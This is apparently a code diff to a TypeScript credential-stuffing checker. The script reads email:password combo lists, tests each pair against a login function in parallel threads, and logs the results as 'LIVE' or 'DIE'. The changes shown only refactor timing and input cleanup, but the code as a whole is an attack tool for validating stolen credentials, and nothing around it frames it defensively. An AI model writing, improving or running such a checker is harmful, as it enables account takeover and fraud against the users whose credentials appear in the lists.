@@ -144,9 +144,22 @@ const checkLogin = async ({ email, password }: CheckLoginProps) => {
   }
 };
 
+const calculateExecutionTime = (startTime: number) => {
+  // end time
+  const endTime = new Date().getTime();
+
+  // Calculate the elapsed time in milliseconds
+  const elapsedTimeMs = endTime - startTime;
+
+  // Convert elapsed time to seconds
+  const elapsedTimeSeconds = elapsedTimeMs / 1000;
+
+  return elapsedTimeSeconds;
+};
+
 const start = async () => {
   let lists = collect(readFileSync(config.listFile, "utf-8").split("\n"))
-    .map((line) => line.split(":"))
+    .map((line) => line.replace(/\r/, "").replace(/\t/, "").trim().split(":"))
     .map(([email, password]) => ({ email, password }))
     .filter(({ email, password }) => Boolean(email) && Boolean(password));
 
@@ -154,7 +167,7 @@ const start = async () => {
     lists.toArray() as CheckLoginProps[],
     config.threadSize,
     async ({ email, password }: CheckLoginProps) => {
-      const start = new Date().getTime();
+      const startTime = new Date().getTime();
       const emailPassword = `${email}|${password}`;
 
       try {
@@ -166,11 +179,11 @@ const start = async () => {
           appendFileSync("results/die.txt", `${emailPassword}\n`);
         }
 
-        const end = new Date().getTime();
-        const elapsedTime = start - end;
+        // get elapsed time
+        const elapsedTimeSeconds = calculateExecutionTime(startTime);
 
         console.log(
-          `${elapsedTime} milliseconds: ${emailPassword} - ${
+          `${elapsedTimeSeconds}s ${emailPassword} - ${
             loginStatus ? "LIVE" : "DIE"
           }`,
         );
@@ -204,11 +217,11 @@ const start = async () => {
           );
         }
 
-        const end = new Date().getTime();
-        const elapsedTime = start - end;
+        // get elapsed time
+        const elapsedTimeSeconds = calculateExecutionTime(startTime);
 
         console.log(
-          `${elapsedTime} milliseconds: ${emailPassword} - ${errorMessage}`,
+          `${elapsedTimeSeconds}s ${emailPassword} - ${errorMessage}`,
         );
       } finally {
         //
